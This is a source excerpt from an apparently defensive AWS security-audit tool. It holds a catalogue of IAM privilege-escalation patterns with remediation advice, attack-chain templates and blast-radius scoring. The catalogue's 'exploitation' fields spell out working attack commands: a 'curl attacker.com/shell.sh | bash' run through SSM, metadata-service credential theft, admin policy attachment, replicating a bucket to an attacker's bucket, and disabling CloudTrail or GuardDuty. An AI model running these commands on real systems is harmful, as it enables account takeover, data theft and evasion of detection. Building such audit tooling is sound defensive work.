async function scanSSMSecurity(region: string): Promise<string> {
  let output = `# AWS Systems Manager Security Analysis\n\n`;
  output += `**Region:** ${region}\n\n`;

  try {
    // Note: Would need @aws-sdk/client-ssm import
    output += `## SSM Security Considerations\n\n`;
    output += `### Session Manager\n`;
    output += `- Check if session logging is enabled (S3/CloudWatch)\n`;
    output += `- Verify KMS encryption for session data\n`;
    output += `- Review IAM policies for ssm:StartSession\n\n`;

    output += `### Parameter Store\n`;
    output += `- SecureString parameters should use KMS encryption\n`;
    output += `- Check for hardcoded credentials in parameters\n`;
    output += `- Review access policies for sensitive parameters\n\n`;

    output += `### SSM Documents\n`;
    output += `- Review custom documents for embedded credentials\n`;
    output += `- Check document sharing settings\n`;
    output += `- Audit automation runbooks for privilege escalation\n\n`;

    output += `## Attack Vectors\n\n`;
    output += `| Vector | Risk | Detection |\n`;
    output += `|--------|------|----------|\n`;
    output += `| Session hijacking | HIGH | CloudTrail: StartSession |\n`;
    output += `| Parameter exfiltration | MEDIUM | CloudTrail: GetParameter |\n`;
    output += `| Document injection | HIGH | Monitor document changes |\n`;
    output += `| Patch compliance bypass | MEDIUM | Compliance dashboard |\n`;

  } catch (error: any) {
    output += `[FAIL] Error: ${error.message}\n`;
  }

  return output;
}

// ============================================================================
// ATTACK CHAIN BUILDER & ADVANCED PRIVILEGE ESCALATION ANALYSIS
// Based on Heimdall patterns and Rhino Security Labs research
// ============================================================================

interface PrivescPattern {
  id: string;
  name: string;
  description: string;
  requiredActions: string[];
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  mitreTechnique: string;
  mitreId: string;
  category: string;
  exploitation: string;
  remediation: string;
}

interface AttackChainStep {
  stepNumber: number;
  action: string;
  target: string;
  technique: string;
  mitreId: string;
  command: string;
}

interface AttackChain {
  chainId: string;
  name: string;
  description: string;
  initialPrincipal: string;
  finalTarget: string;
  blastRadius: number;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  steps: AttackChainStep[];
  mitreMapping: string[];
}

// 50+ Privilege Escalation Patterns (Rhino Security Labs + Heimdall)
const PRIVESC_PATTERNS: PrivescPattern[] = [
  // === PASSROLE ABUSE PATTERNS ===
  {
    id: 'passrole-lambda',
    name: 'PassRole to Lambda',
    description: 'Create Lambda with high-privilege role and invoke to execute code',
    requiredActions: ['iam:PassRole', 'lambda:CreateFunction', 'lambda:InvokeFunction'],
    severity: 'CRITICAL',
    mitreTechnique: 'Privilege Escalation via Lambda',
    mitreId: 'T1078.004',
    category: 'PASSROLE_EXECUTION',
    exploitation: `
1. aws iam list-roles --query "Roles[?contains(AssumeRolePolicyDocument.Statement[].Principal.Service,'lambda.amazonaws.com')]"
2. aws lambda create-function --function-name privesc --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/TARGET_ROLE --handler index.handler --zip-file fileb://malicious.zip
3. aws lambda invoke --function-name privesc output.txt`,
    remediation: 'Add iam:PassRole condition to restrict which roles can be passed'
  },
  {
    id: 'passrole-ec2',
    name: 'PassRole to EC2',
    description: 'Launch EC2 with high-privilege instance profile for credential theft',
    requiredActions: ['iam:PassRole', 'ec2:RunInstances'],
    severity: 'CRITICAL',
    mitreTechnique: 'Privilege Escalation via EC2',
    mitreId: 'T1078.004',
    category: 'PASSROLE_EXECUTION',
    exploitation: `
1. aws iam list-instance-profiles
2. aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro --iam-instance-profile Name=TARGET_PROFILE
3. SSH to instance, curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
    remediation: 'Restrict iam:PassRole with resource conditions'
  },
  {
    id: 'passrole-glue',
    name: 'PassRole to Glue',
    description: 'Create Glue job with privileged role to execute arbitrary code',
    requiredActions: ['iam:PassRole', 'glue:CreateJob', 'glue:StartJobRun'],
    severity: 'HIGH',
    mitreTechnique: 'Execution via Glue',
    mitreId: 'T1059',
    category: 'PASSROLE_EXECUTION',
    exploitation: `
1. aws glue create-job --name privesc-job --role arn:aws:iam::ACCOUNT:role/GlueRole --command Name=pythonshell,ScriptLocation=s3://bucket/malicious.py
2. aws glue start-job-run --job-name privesc-job`,
    remediation: 'Restrict Glue roles and S3 script locations'
  },
  {
    id: 'passrole-cloudformation',
    name: 'PassRole to CloudFormation',
    description: 'Create stack with privileged role to provision resources',
    requiredActions: ['iam:PassRole', 'cloudformation:CreateStack'],
    severity: 'CRITICAL',
    mitreTechnique: 'Infrastructure Modification',
    mitreId: 'T1578',
    category: 'PASSROLE_EXECUTION',
    exploitation: `
1. Create template with IAM::User or Lambda resources
2. aws cloudformation create-stack --stack-name privesc --template-body file://template.yaml --role-arn arn:aws:iam::ACCOUNT:role/CFNRole --capabilities CAPABILITY_IAM`,
    remediation: 'Use CloudFormation StackSets with restricted permissions'
  },
  {
    id: 'passrole-codebuild',
    name: 'PassRole to CodeBuild',
    description: 'Create CodeBuild project with privileged role for RCE',
    requiredActions: ['iam:PassRole', 'codebuild:CreateProject', 'codebuild:StartBuild'],
    severity: 'HIGH',
    mitreTechnique: 'Execution via CodeBuild',
    mitreId: 'T1059',
    category: 'PASSROLE_EXECUTION',
    exploitation: `
1. aws codebuild create-project --name privesc --source type=NO_SOURCE,buildspec="..." --service-role arn:aws:iam::ACCOUNT:role/CodeBuildRole
2. aws codebuild start-build --project-name privesc`,
    remediation: 'Restrict CodeBuild roles and source locations'
  },
  {
    id: 'passrole-sagemaker',
    name: 'PassRole to SageMaker',
    description: 'Create SageMaker notebook with privileged execution role',
    requiredActions: ['iam:PassRole', 'sagemaker:CreateNotebookInstance'],
    severity: 'HIGH',
    mitreTechnique: 'Execution via SageMaker',
    mitreId: 'T1059',
    category: 'PASSROLE_EXECUTION',
    exploitation: `
1. aws sagemaker create-notebook-instance --notebook-instance-name privesc --instance-type ml.t2.medium --role-arn arn:aws:iam::ACCOUNT:role/SageMakerRole
2. Access Jupyter notebook via presigned URL`,
    remediation: 'Restrict SageMaker roles and network access'
  },
  {
    id: 'passrole-ecs',
    name: 'PassRole to ECS Task',
    description: 'Run ECS task with privileged task role',
    requiredActions: ['iam:PassRole', 'ecs:RegisterTaskDefinition', 'ecs:RunTask'],
    severity: 'HIGH',
    mitreTechnique: 'Execution via Containers',
    mitreId: 'T1610',
    category: 'PASSROLE_EXECUTION',
    exploitation: `
1. aws ecs register-task-definition --family privesc --task-role-arn arn:aws:iam::ACCOUNT:role/ECSTaskRole --container-definitions [...]
2. aws ecs run-task --cluster default --task-definition privesc`,
    remediation: 'Restrict ECS task roles and cluster access'
  },
  // === POLICY MANIPULATION PATTERNS ===
  {
    id: 'attach-admin-policy',
    name: 'Attach Administrator Policy',
    description: 'Attach AdministratorAccess policy to self',
    requiredActions: ['iam:AttachUserPolicy'],
    severity: 'CRITICAL',
    mitreTechnique: 'Account Manipulation',
    mitreId: 'T1098',
    category: 'POLICY_MANIPULATION',
    exploitation: `aws iam attach-user-policy --user-name CURRENT_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`,
    remediation: 'Use SCPs to deny AttachUserPolicy for admin policies'
  },
  {
    id: 'attach-role-policy',
    name: 'Attach Policy to Role',
    description: 'Attach powerful policy to assumable role',
    requiredActions: ['iam:AttachRolePolicy', 'sts:AssumeRole'],
    severity: 'HIGH',
    mitreTechnique: 'Account Manipulation',
    mitreId: 'T1098',
    category: 'POLICY_MANIPULATION',
    exploitation: `
1. aws iam attach-role-policy --role-name TARGET_ROLE --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
2. aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/TARGET_ROLE --role-session-name privesc`,
    remediation: 'Restrict AttachRolePolicy with conditions'
  },
  {
    id: 'put-user-policy',
    name: 'Create Inline User Policy',
    description: 'Add inline policy with elevated permissions',
    requiredActions: ['iam:PutUserPolicy'],
    severity: 'CRITICAL',
    mitreTechnique: 'Account Manipulation',
    mitreId: 'T1098',
    category: 'POLICY_MANIPULATION',
    exploitation: `aws iam put-user-policy --user-name CURRENT_USER --policy-name AdminAccess --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'`,
    remediation: 'Deny PutUserPolicy via SCP'
  },
  {
    id: 'put-role-policy',
    name: 'Create Inline Role Policy',
    description: 'Add inline policy to assumable role',
    requiredActions: ['iam:PutRolePolicy', 'sts:AssumeRole'],
    severity: 'HIGH',
    mitreTechnique: 'Account Manipulation',
    mitreId: 'T1098',
    category: 'POLICY_MANIPULATION',
    exploitation: `
1. aws iam put-role-policy --role-name TARGET_ROLE --policy-name AdminAccess --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
2. aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/TARGET_ROLE --role-session-name privesc`,
    remediation: 'Restrict PutRolePolicy with conditions'
  },
  {
    id: 'create-policy-version',
    name: 'Create Policy Version',
    description: 'Create new default policy version with elevated permissions',
    requiredActions: ['iam:CreatePolicyVersion'],
    severity: 'CRITICAL',
    mitreTechnique: 'Account Manipulation',
    mitreId: 'T1098',
    category: 'POLICY_MANIPULATION',
    exploitation: `aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/MY_POLICY --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --set-as-default`,
    remediation: 'Deny CreatePolicyVersion via SCP'
  },
  {
    id: 'set-default-policy-version',
    name: 'Set Default Policy Version',
    description: 'Change default policy version to one with elevated permissions',
    requiredActions: ['iam:SetDefaultPolicyVersion'],
    severity: 'HIGH',
    mitreTechnique: 'Account Manipulation',
    mitreId: 'T1098',
    category: 'POLICY_MANIPULATION',
    exploitation: `aws iam set-default-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/MY_POLICY --version-id v2`,
    remediation: 'Deny SetDefaultPolicyVersion via SCP'
  },
  // === CREDENTIAL ACCESS PATTERNS ===
  {
    id: 'create-access-key',
    name: 'Create Access Key',
    description: 'Create access key for another user',
    requiredActions: ['iam:CreateAccessKey'],
    severity: 'HIGH',
    mitreTechnique: 'Valid Accounts: Cloud',
    mitreId: 'T1078.004',
    category: 'CREDENTIAL_ACCESS',
    exploitation: `aws iam create-access-key --user-name ADMIN_USER`,
    remediation: 'Restrict CreateAccessKey to self only'
  },
  {
    id: 'create-login-profile',
    name: 'Create Login Profile',
    description: 'Create console password for another user',
    requiredActions: ['iam:CreateLoginProfile'],
    severity: 'HIGH',
    mitreTechnique: 'Valid Accounts: Cloud',
    mitreId: 'T1078.004',
    category: 'CREDENTIAL_ACCESS',
    exploitation: `aws iam create-login-profile --user-name ADMIN_USER --password MyP@ssw0rd! --no-password-reset-required`,
    remediation: 'Restrict CreateLoginProfile to self only'
  },
  {
    id: 'update-login-profile',
    name: 'Update Login Profile',
    description: 'Reset password for another user',
    requiredActions: ['iam:UpdateLoginProfile'],
    severity: 'HIGH',
    mitreTechnique: 'Valid Accounts: Cloud',
    mitreId: 'T1078.004',
    category: 'CREDENTIAL_ACCESS',
    exploitation: `aws iam update-login-profile --user-name ADMIN_USER --password NewP@ssw0rd!`,
    remediation: 'Restrict UpdateLoginProfile to self only'
  },
  {
    id: 'update-assume-role-policy',
    name: 'Update Assume Role Policy',
    description: 'Modify trust policy to allow self assumption',
    requiredActions: ['iam:UpdateAssumeRolePolicy'],
    severity: 'CRITICAL',
    mitreTechnique: 'Account Manipulation',
    mitreId: 'T1098',
    category: 'CREDENTIAL_ACCESS',
    exploitation: `aws iam update-assume-role-policy --role-name ADMIN_ROLE --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ACCOUNT:user/ATTACKER"},"Action":"sts:AssumeRole"}]}'`,
    remediation: 'Restrict UpdateAssumeRolePolicy via SCP'
  },
  // === EKS ABUSE PATTERNS ===
  {
    id: 'eks-irsa-abuse',
    name: 'IRSA Pod Execution Abuse',
    description: 'Exploit IRSA-enabled service account by scheduling malicious pod',
    requiredActions: ['eks:DescribeCluster', 'eks:AccessKubernetesApi'],
    severity: 'CRITICAL',
    mitreTechnique: 'Container Administration Command',
    mitreId: 'T1609',
    category: 'EKS_ABUSE',
    exploitation: `
1. kubectl get serviceaccounts -A -o json | jq '.items[] | select(.metadata.annotations["eks.amazonaws.com/role-arn"])'
2. Create pod with target serviceAccountName
3. kubectl exec -it malicious-pod -- aws sts get-caller-identity`,
    remediation: 'Use Pod Security Policies/Standards, restrict serviceAccountName'
  },
  {
    id: 'eks-node-role-theft',
    name: 'EKS Node Role Credential Theft',
    description: 'Steal node IAM role credentials via IMDS from compromised pod',
    requiredActions: [],
    severity: 'CRITICAL',
    mitreTechnique: 'Unsecured Credentials',
    mitreId: 'T1552',
    category: 'EKS_ABUSE',
    exploitation: `
1. kubectl exec -it pod -- curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. Get role name from response
3. curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`,
    remediation: 'Use IMDSv2, restrict IMDS access in network policy'
  },
  {
    id: 'eks-cluster-admin',
    name: 'EKS Cluster Admin Access',
    description: 'Use UpdateClusterConfig permission for cluster admin access',
    requiredActions: ['eks:UpdateClusterConfig'],
    severity: 'CRITICAL',
    mitreTechnique: 'Account Manipulation',
    mitreId: 'T1098',
    category: 'EKS_ABUSE',
    exploitation: `
1. aws eks update-cluster-config --name CLUSTER --resources-vpc-config endpointPublicAccess=true
2. Add self to aws-auth ConfigMap with system:masters group`,
    remediation: 'Restrict UpdateClusterConfig, use private endpoint'
  },
  {
    id: 'eks-create-fargate-profile',
    name: 'EKS Fargate Profile PassRole',
    description: 'Create Fargate profile to pass execution role',
    requiredActions: ['iam:PassRole', 'eks:CreateFargateProfile'],
    severity: 'HIGH',
    mitreTechnique: 'Container Administration Command',
    mitreId: 'T1609',
    category: 'EKS_ABUSE',
    exploitation: `
1. aws eks create-fargate-profile --cluster-name CLUSTER --fargate-profile-name malicious --pod-execution-role-arn arn:aws:iam::ACCOUNT:role/PRIV_ROLE --selectors namespace=default
2. Schedule pod in default namespace to get PRIV_ROLE credentials`,
    remediation: 'Restrict Fargate profile creation, limit pod execution roles'
  },
  {
    id: 'eks-describe-all',
    name: 'EKS Wildcard Describe',
    description: 'Enumerate all EKS clusters and configurations',
    requiredActions: ['eks:Describe*', 'eks:List*'],
    severity: 'MEDIUM',
    mitreTechnique: 'Cloud Infrastructure Discovery',
    mitreId: 'T1580',
    category: 'EKS_ABUSE',
    exploitation: `
1. aws eks list-clusters
2. aws eks describe-cluster --name CLUSTER
3. aws eks list-nodegroups --cluster-name CLUSTER`,
    remediation: 'Apply least privilege for EKS describe permissions'
  },
  // === LAMBDA ABUSE PATTERNS ===
  {
    id: 'lambda-update-code',
    name: 'Update Lambda Code',
    description: 'Modify existing Lambda function code to backdoor execution',
    requiredActions: ['lambda:UpdateFunctionCode'],
    severity: 'HIGH',
    mitreTechnique: 'Server Software Component',
    mitreId: 'T1505',
    category: 'LAMBDA_ABUSE',
    exploitation: `
1. aws lambda list-functions --query "Functions[?Role contains 'admin']"
2. aws lambda update-function-code --function-name TARGET_FN --zip-file fileb://backdoor.zip`,
    remediation: 'Restrict UpdateFunctionCode, use code signing'
  },
  {
    id: 'lambda-add-layer',
    name: 'Add Malicious Lambda Layer',
    description: 'Add layer with malicious code to existing function',
    requiredActions: ['lambda:UpdateFunctionConfiguration', 'lambda:PublishLayerVersion'],
    severity: 'HIGH',
    mitreTechnique: 'Hijack Execution Flow',
    mitreId: 'T1574',
    category: 'LAMBDA_ABUSE',
    exploitation: `
1. aws lambda publish-layer-version --layer-name backdoor --zip-file fileb://layer.zip
2. aws lambda update-function-configuration --function-name TARGET_FN --layers arn:aws:lambda:region:ACCOUNT:layer:backdoor:1`,
    remediation: 'Restrict layer management, audit layer sources'
  },
  {
    id: 'lambda-env-secrets',
    name: 'Lambda Environment Variable Secrets',
    description: 'Extract secrets from Lambda environment variables',
    requiredActions: ['lambda:GetFunctionConfiguration'],
    severity: 'MEDIUM',
    mitreTechnique: 'Unsecured Credentials',
    mitreId: 'T1552',
    category: 'LAMBDA_ABUSE',
    exploitation: `aws lambda get-function-configuration --function-name TARGET_FN --query "Environment.Variables"`,
    remediation: 'Use Secrets Manager instead of env vars'
  },
  // === SSM ABUSE PATTERNS ===
  {
    id: 'ssm-run-command',
    name: 'SSM Run Command',
    description: 'Execute commands on EC2 instances via SSM',
    requiredActions: ['ssm:SendCommand'],
    severity: 'CRITICAL',
    mitreTechnique: 'System Services: Service Execution',
    mitreId: 'T1569',
    category: 'SSM_ABUSE',
    exploitation: `aws ssm send-command --instance-ids i-xxx --document-name AWS-RunShellScript --parameters commands=["curl http://attacker.com/shell.sh | bash"]`,
    remediation: 'Restrict SSM SendCommand with conditions'
  },
  {
    id: 'ssm-start-session',
    name: 'SSM Start Session',
    description: 'Get shell access to EC2 via SSM Session Manager',
    requiredActions: ['ssm:StartSession'],
    severity: 'HIGH',
    mitreTechnique: 'Remote Services',
    mitreId: 'T1021',
    category: 'SSM_ABUSE',
    exploitation: `aws ssm start-session --target i-xxx`,
    remediation: 'Restrict StartSession, enable session logging'
  },
  {
    id: 'ssm-get-parameters',
    name: 'SSM Parameter Store Secrets',
    description: 'Extract secrets from SSM Parameter Store',
    requiredActions: ['ssm:GetParameter', 'ssm:GetParameters'],
    severity: 'HIGH',
    mitreTechnique: 'Unsecured Credentials',
    mitreId: 'T1552',
    category: 'SSM_ABUSE',
    exploitation: `
1. aws ssm describe-parameters --query "Parameters[?contains(Name,'secret') || contains(Name,'password') || contains(Name,'key')]"
2. aws ssm get-parameter --name /secrets/db-password --with-decryption`,
    remediation: 'Restrict parameter access by path'
  },
  // === S3 ABUSE PATTERNS ===
  {
    id: 's3-data-exfil',
    name: 'S3 Data Exfiltration',
    description: 'Replicate or copy data to external bucket',
    requiredActions: ['s3:PutReplicationConfiguration'],
    severity: 'HIGH',
    mitreTechnique: 'Transfer Data to Cloud Account',
    mitreId: 'T1537',
    category: 'S3_ABUSE',
    exploitation: `aws s3api put-bucket-replication --bucket SOURCE_BUCKET --replication-configuration '{"Role":"arn:aws:iam::ACCOUNT:role/replication","Rules":[{"Status":"Enabled","Destination":{"Bucket":"arn:aws:s3:::ATTACKER_BUCKET"}}]}'`,
    remediation: 'Restrict PutReplicationConfiguration, monitor replication rules'
  },
  {
    id: 's3-bucket-policy',
    name: 'Modify S3 Bucket Policy',
    description: 'Add permissive bucket policy for data access',
    requiredActions: ['s3:PutBucketPolicy'],
    severity: 'HIGH',
    mitreTechnique: 'Data Manipulation',
    mitreId: 'T1565',
    category: 'S3_ABUSE',
    exploitation: `aws s3api put-bucket-policy --bucket TARGET_BUCKET --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":"*","Action":"s3:GetObject","Resource":"arn:aws:s3:::TARGET_BUCKET/*"}]}'`,
    remediation: 'Use S3 Block Public Access, restrict PutBucketPolicy'
  },
  // === SECRETS MANAGER ABUSE ===
  {
    id: 'secrets-manager-get',
    name: 'Get Secret Value',
    description: 'Retrieve secrets from Secrets Manager',
    requiredActions: ['secretsmanager:GetSecretValue'],
    severity: 'HIGH',
    mitreTechnique: 'Unsecured Credentials',
    mitreId: 'T1552',
    category: 'SECRETS_ACCESS',
    exploitation: `
1. aws secretsmanager list-secrets
2. aws secretsmanager get-secret-value --secret-id prod/database/credentials`,
    remediation: 'Restrict secret access by resource ARN'
  },
  // === CLOUDTRAIL EVASION ===
  {
    id: 'cloudtrail-stop',
    name: 'Stop CloudTrail Logging',
    description: 'Disable CloudTrail to evade detection',
    requiredActions: ['cloudtrail:StopLogging'],
    severity: 'CRITICAL',
    mitreTechnique: 'Impair Defenses',
    mitreId: 'T1562',
    category: 'DEFENSE_EVASION',
    exploitation: `aws cloudtrail stop-logging --name my-trail`,
    remediation: 'Use SCP to deny StopLogging'
  },
  {
    id: 'cloudtrail-delete',
    name: 'Delete CloudTrail',
    description: 'Delete CloudTrail trail to remove logging',
    requiredActions: ['cloudtrail:DeleteTrail'],
    severity: 'CRITICAL',
    mitreTechnique: 'Impair Defenses',
    mitreId: 'T1562',
    category: 'DEFENSE_EVASION',
    exploitation: `aws cloudtrail delete-trail --name my-trail`,
    remediation: 'Use SCP to deny DeleteTrail'
  },
  {
    id: 'guardduty-disable',
    name: 'Disable GuardDuty',
    description: 'Disable GuardDuty threat detection',
    requiredActions: ['guardduty:DeleteDetector'],
    severity: 'CRITICAL',
    mitreTechnique: 'Impair Defenses',
    mitreId: 'T1562',
    category: 'DEFENSE_EVASION',
    exploitation: `aws guardduty delete-detector --detector-id xxx`,
    remediation: 'Use SCP to deny DeleteDetector'
  },
];

const ATTACK_CHAIN_TEMPLATES: { 
  name: string; 
  description: string;
  steps: { action: string; target: string; technique: string; mitreId: string }[];
  requiredPermissions: string[];
}[] = [
  {
    name: 'PassRole → Lambda → Secrets',
    description: 'Create Lambda with privileged role to access Secrets Manager',
    steps: [
      { action: 'iam:PassRole', target: 'Lambda service', technique: 'Privilege Escalation', mitreId: 'T1078.004' },
      { action: 'lambda:CreateFunction', target: 'New Lambda function', technique: 'Execution', mitreId: 'T1059' },
      { action: 'lambda:InvokeFunction', target: 'Lambda execution', technique: 'Execution', mitreId: 'T1059' },
      { action: 'secretsmanager:GetSecretValue', target: 'Secrets', technique: 'Credential Access', mitreId: 'T1552' },
    ],
    requiredPermissions: ['iam:PassRole', 'lambda:CreateFunction', 'lambda:InvokeFunction'],
  },
  {
    name: 'PassRole → EC2 → IMDS → Secrets',
    description: 'Launch EC2 with privileged role, steal credentials via IMDS',
    steps: [
      { action: 'iam:PassRole', target: 'EC2 service', technique: 'Privilege Escalation', mitreId: 'T1078.004' },
      { action: 'ec2:RunInstances', target: 'New EC2 instance', technique: 'Execution', mitreId: 'T1059' },
      { action: 'IMDS Query', target: 'Instance metadata', technique: 'Credential Access', mitreId: 'T1552' },
      { action: 'sts:AssumeRole', target: 'High privilege role', technique: 'Privilege Escalation', mitreId: 'T1078.004' },
    ],
    requiredPermissions: ['iam:PassRole', 'ec2:RunInstances'],
  },
  {
    name: 'AttachPolicy → AssumeRole → Admin',
    description: 'Attach admin policy to role, then assume it',
    steps: [
      { action: 'iam:AttachRolePolicy', target: 'Target role', technique: 'Persistence', mitreId: 'T1098' },
      { action: 'sts:AssumeRole', target: 'Modified role', technique: 'Privilege Escalation', mitreId: 'T1078.004' },
      { action: 'iam:*', target: 'Full IAM access', technique: 'Privilege Escalation', mitreId: 'T1078.004' },
    ],
    requiredPermissions: ['iam:AttachRolePolicy', 'sts:AssumeRole'],
  },
  {
    name: 'SSM → EC2 → Pivot',
    description: 'Use SSM to execute commands on EC2 for lateral movement',
    steps: [
      { action: 'ssm:SendCommand', target: 'EC2 instance', technique: 'Execution', mitreId: 'T1569' },
      { action: 'Shell access', target: 'Instance OS', technique: 'Lateral Movement', mitreId: 'T1021' },
      { action: 'IMDS/creds', target: 'Instance role', technique: 'Credential Access', mitreId: 'T1552' },
      { action: 'Pivot to AWS', target: 'AWS API', technique: 'Lateral Movement', mitreId: 'T1021' },
    ],
    requiredPermissions: ['ssm:SendCommand'],
  },
  {
    name: 'EKS IRSA → AWS API',
    description: 'Abuse IRSA to get AWS credentials from Kubernetes pod',
    steps: [
      { action: 'eks:DescribeCluster', target: 'EKS cluster', technique: 'Discovery', mitreId: 'T1580' },
      { action: 'kubectl apply', target: 'Malicious pod', technique: 'Execution', mitreId: 'T1609' },
      { action: 'IRSA credentials', target: 'Pod IAM role', technique: 'Credential Access', mitreId: 'T1552' },
      { action: 'AWS API calls', target: 'AWS resources', technique: 'Impact', mitreId: 'T1565' },
    ],
    requiredPermissions: ['eks:DescribeCluster', 'eks:AccessKubernetesApi'],
  },
  {
    name: 'Lambda Layer Backdoor',
    description: 'Add malicious layer to existing Lambda for persistence',
    steps: [
      { action: 'lambda:PublishLayerVersion', target: 'New layer', technique: 'Persistence', mitreId: 'T1505' },
      { action: 'lambda:UpdateFunctionConfiguration', target: 'Existing Lambda', technique: 'Persistence', mitreId: 'T1574' },
      { action: 'Lambda invocation', target: 'Backdoor execution', technique: 'Execution', mitreId: 'T1059' },
    ],
    requiredPermissions: ['lambda:PublishLayerVersion', 'lambda:UpdateFunctionConfiguration'],
  },
];

/**
 * Calculate blast radius score (0-100) based on compromised resources
 */
function calculateBlastRadius(permissions: string[], services: string[], resourceCount: number): number {
  let score = 0;
  
  // Admin/wildcard permissions are critical
  const adminPermissions = permissions.filter(p => 
    p.includes(':*') || p === '*' || p.includes('Administrator')
  );
  score += adminPermissions.length * 20;
  
  // High-value services
  const highValueServices = ['iam', 's3', 'secretsmanager', 'kms', 'ec2', 'lambda', 'rds'];
  const affectedHighValue = services.filter(s => highValueServices.includes(s.toLowerCase()));
  score += affectedHighValue.length * 10;
  
  // Resource count factor
  score += Math.min(resourceCount * 2, 30);
  
  // Cross-account capability
  if (permissions.some(p => p.includes('sts:AssumeRole'))) {
    score += 15;
  }
  
  // Data access
  if (permissions.some(p => p.includes('s3:Get') || p.includes('secretsmanager:Get'))) {
    score += 10;
  }
  
  return Math.min(score, 100);
}

/**
 * Build attack chains from IAM findings
 */
async function buildAttackChains(region: string = 'us-east-1', principalArn?: string, minSeverity: string = 'HIGH'): Promise<string> {
  let output = `# 🔗 Attack Chain Analysis\n\n`;
  output += `**Region:** ${region}\n`;
  output += `**Target Principal:** ${principalArn || 'All principals'}\n`;
  output += `**Minimum Severity:** ${minSeverity}\n\n`;
  
  const chains: AttackChain[] = [];
  const severityOrder = { 'LOW': 0, 'MEDIUM': 1, 'HIGH': 2, 'CRITICAL': 3 };
  const minSeverityNum = severityOrder[minSeverity as keyof typeof severityOrder] || 2;
  
  try {
    // Get all IAM users and roles
    const usersCmd = new ListUsersCommand({});
    const users = await iamClient.send(usersCmd);
    
    const rolesCmd = new ListRolesCommand({});
    const roles = await iamClient.send(rolesCmd);
    
    const principals: { arn: string; type: 'User' | 'Role'; name: string }[] = [];
    
    for (const user of users.Users || []) {
      if (!principalArn || user.Arn === principalArn) {
        principals.push({ arn: user.Arn!, type: 'User', name: user.UserName! });
      }
    }
    
    for (const role of roles.Roles || []) {
      if (!principalArn || role.Arn === principalArn) {
        // Skip AWS service roles
        if (!role.Arn?.includes('aws-service-role')) {
          principals.push({ arn: role.Arn!, type: 'Role', name: role.RoleName! });
        }
      }
    }
    
    output += `## 📊 Analysis Scope\n\n`;
    output += `- **Users analyzed:** ${principals.filter(p => p.type === 'User').length}\n`;
    output += `- **Roles analyzed:** ${principals.filter(p => p.type === 'Role').length}\n\n`;
    
    // Analyze each principal for attack chains
    for (const principal of principals.slice(0, 20)) { // Limit for performance
      const permissions = await getPrincipalEffectivePermissions(principal.arn, principal.type);
      
      // Check for each attack chain template
      for (const template of ATTACK_CHAIN_TEMPLATES) {
        const hasRequired = template.requiredPermissions.every(perm => 
          permissions.some(p => matchesPermission(p, perm))
        );
        
        if (hasRequired) {
          const affectedServices = [...new Set(template.requiredPermissions.map(p => p.split(':')[0]))];
          const blastRadius = calculateBlastRadius(permissions, affectedServices, 10);
          
          const severity = blastRadius >= 80 ? 'CRITICAL' : 
                          blastRadius >= 60 ? 'HIGH' : 
                          blastRadius >= 40 ? 'MEDIUM' : 'LOW';
          
          if (severityOrder[severity] >= minSeverityNum) {
            chains.push({
              chainId: `chain-${chains.length + 1}`,
              name: template.name,
              description: template.description,
              initialPrincipal: principal.arn,
              finalTarget: template.steps[template.steps.length - 1].target,
              blastRadius,
              severity,
              steps: template.steps.map((step, idx) => ({
                stepNumber: idx + 1,
                action: step.action,
                target: step.target,
                technique: step.technique,
                mitreId: step.mitreId,
                command: `# ${step.action} → ${step.target}`,
              })),
              mitreMapping: [...new Set(template.steps.map(s => s.mitreId))],
            });
          }
        }
      }
    }
    
    // Sort by blast radius
    chains.sort((a, b) => b.blastRadius - a.blastRadius);
    
    // Output results
    if (chains.length === 0) {
      output += `## ✅ No Attack Chains Found\n\n`;
      output += `No multi-step attack paths were identified for the analyzed principals.\n`;
    } else {
      output += `## 🚨 Attack Chains Identified: ${chains.length}\n\n`;
      
      // Summary table
      output += `| Chain | Principal | Blast Radius | Severity |\n`;
      output += `|-------|-----------|--------------|----------|\n`;
      for (const chain of chains.slice(0, 10)) {
        const principalName = chain.initialPrincipal.split('/').pop() || chain.initialPrincipal;
        const severityIcon = chain.severity === 'CRITICAL' ? '🔴' : chain.severity === 'HIGH' ? '🟠' : '🟡';
        output += `| ${chain.name} | ${principalName} | ${chain.blastRadius}/100 | ${severityIcon} ${chain.severity} |\n`;
      }
      output += `\n`;
      
      // Detailed chain analysis
      for (const chain of chains.slice(0, 5)) {
        output += `---\n\n`;
        output += `### ${chain.severity === 'CRITICAL' ? '🔴' : '🟠'} ${chain.name}\n\n`;
        output += `**Principal:** \`${chain.initialPrincipal}\`\n`;
        output += `**Blast Radius:** ${chain.blastRadius}/100\n`;
        output += `**Final Target:** ${chain.finalTarget}\n\n`;
        
        output += `**Attack Steps:**\n\n`;
        output += `\`\`\`mermaid\n`;
        output += `graph LR\n`;
        for (let i = 0; i < chain.steps.length; i++) {
          const step = chain.steps[i];
          const nextStep = chain.steps[i + 1];
          if (nextStep) {
            output += `    S${i}["${step.action}"] --> S${i + 1}["${nextStep.action}"]\n`;
          }
        }
        output += `\`\`\`\n\n`;
        
        output += `| Step | Action | Target | MITRE |\n`;
        output += `|------|--------|--------|-------|\n`;
        for (const step of chain.steps) {
          output += `| ${step.stepNumber} | ${step.action} | ${step.target} | ${step.mitreId} |\n`;
        }
        output += `\n`;
        
        output += `**MITRE ATT&CK Mapping:** ${chain.mitreMapping.join(', ')}\n\n`;
      }
    }
    
